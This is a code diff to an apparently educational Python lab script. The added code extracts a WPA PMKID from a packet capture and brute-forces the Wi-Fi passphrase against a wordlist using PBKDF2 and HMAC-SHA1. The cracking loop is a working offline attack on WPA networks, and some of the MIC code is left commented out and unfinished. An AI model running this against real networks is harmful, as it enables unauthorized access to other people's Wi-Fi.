@@ -49,32 +49,56 @@ wpa = rdpcap("PMKID_handshake.pcap")
 ass_req = wpa.filter(lambda pkt: pkt if pkt.type == 0 and pkt.subtype == 0 else None)[0]
 ssid = ass_req.getlayer(Dot11Elt).info
 
-fourWayHandshake = wpa.filter(
+messages = wpa.filter(
     lambda pkt: pkt if pkt.haslayer(EAPOL) and pkt.getlayer(EAPOL).type == 3 else None
 )
 
-APmac = a2b_hex(fourWayHandshake[3].addr1.replace(":", ""))
-Clientmac = a2b_hex(fourWayHandshake[3].addr2.replace(":", ""))
-
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-#passPhrase = "actuelle"
 A = "Pairwise key expansion"  # this string is used in the pseudo-random function
 
-# Authenticator and Supplicant Nonces
-ANonce = fourWayHandshake[0].load[13:13+32]
-SNonce = fourWayHandshake[1].load[13:13+32]
-
-# This is the MIC contained in the 4th frame of the 4-way handshake
-# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-mic_to_test = get_mic(fourWayHandshake[3])
-
-pkmid = []
-for l in fourWayHandshake:
-    if get_mic(l) == b'\x00' * 16:
-        pmkid = l.load[101:101+16]
-        #TODO: récupérer Anonce et Snonce et les mac depuis les 2 paquets ; doit etre la meme communication mais osef de la verif tkt
+pmkid = None
+ANonce = None
+SNonce = None
+mac_ap = None
+mac_sta = None
+for m in messages:
+    # Si message 1 sur 4
+    if get_mic(m) == b'\x00' * 16 and mac_ap == None and mac_sta == None:
+        pmkid = m.load[101:101+16]
+        mac_sta = m.addr1
+        mac_ap = m.addr2
+        # TODO: On défini le nonce source (le challenge)
+        ANonce = m.load[13:13+32]
+    elif m.addr2 == mac_ap and m.addr1 == mac_sta:
+        SNonce = m.load[13:13+32]
         break
 
+if pmkid == None:
+    print("Error : no PMKID found")
+    exit(1)
+    
+mac_ap = a2b_hex(mac_ap.replace(":", ""))
+mac_sta = a2b_hex(mac_sta.replace(":", ""))
+passPhrase = None
+
+f = open('pmkid_wordlist.txt', 'rb')
+for line in f.readlines():
+    line = line[:-1]
+    pmk = pbkdf2(hashlib.sha1, line, ssid, 4096, 32)
+    pmkid2 = hmac.new(pmk, b'PMK Name' + mac_ap + mac_sta, hashlib.sha1)
+    pmkid2 = pmkid2.digest()[:16] # On veut 128 bits et non 160
+    
+    line = line.decode()
+    print(f"Password tested : `{line}`")
+    if pmkid == pmkid2:
+        print(f"Password found : `{line}`")
+        passPhrase = line
+        break
+
+f.close()
+
+APmac = mac_ap
+Clientmac = mac_sta
 
 B = (
     min(APmac, Clientmac)
@@ -82,9 +106,6 @@ B = (
     + min(ANonce, SNonce)
     + max(ANonce, SNonce)
 )  # used in pseudo-random function
-
-eapol = fourWayHandshake[3].getlayer(EAPOL)
-data = eapol.version.to_bytes(1, 'big') + eapol.type.to_bytes(1, 'big') + eapol.len.to_bytes(2, 'big') + eapol.load[:77] + b'\x00'*18
 
 print("\n\nValues used to derivate keys")
 print("============================")
@@ -103,7 +124,7 @@ pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
 ptk = customPRF512(pmk, str.encode(A), B)
 
 # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16], data, hashlib.sha1)
+#mic = hmac.new(ptk[0:16], data, hashlib.sha1)
 
 
 print("\nResults of the key expansion")
@@ -114,4 +135,5 @@ print("KCK:\t\t", ptk[0:16].hex(), "\n")
 print("KEK:\t\t", ptk[16:32].hex(), "\n")
 print("TK:\t\t", ptk[32:48].hex(), "\n")
 print("MICK:\t\t", ptk[48:64].hex(), "\n")
-print("MIC:\t\t", mic.hexdigest(), "\n")
+#TODO: ??
+#print("MIC:\t\t", mic.hexdigest(), "\n")
